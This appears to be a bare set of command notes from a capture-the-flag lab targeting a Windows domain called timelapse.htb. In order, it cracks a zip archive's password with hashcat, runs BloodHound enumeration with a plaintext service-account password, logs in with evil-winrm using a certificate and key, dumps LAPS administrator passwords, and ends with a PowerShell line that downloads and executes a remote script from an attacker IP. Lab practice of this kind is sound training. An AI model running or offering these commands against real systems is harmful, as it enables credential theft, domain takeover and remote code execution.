``` bash

zip2hashcat winrm_backup.zip > zip.hashcat
hashcat -m 17200 zip.hashcat /usr/share/wordlists/rockyou.txt --show

```

``` shell
bloodhound-python -c all -d timelapse.htb -gc timelapse.htb -dc dc01.timelapse.htb -ns 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --disable-autogc --zip
```

```shell 
evil-winrm -i timelapse.htb -c legacy.cert -k legacy.key -S -r TIMELAPSE.htb
evil-winrm -i timelapse.htb -u 'svc_deply' -p ''
```

```

```

```shell
python3 /opt/pyLAPS/pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```



```powershell 
IEX(New-Object Net.WebClient).downloadString("http://10.10.16.2/rev.ps1")
```
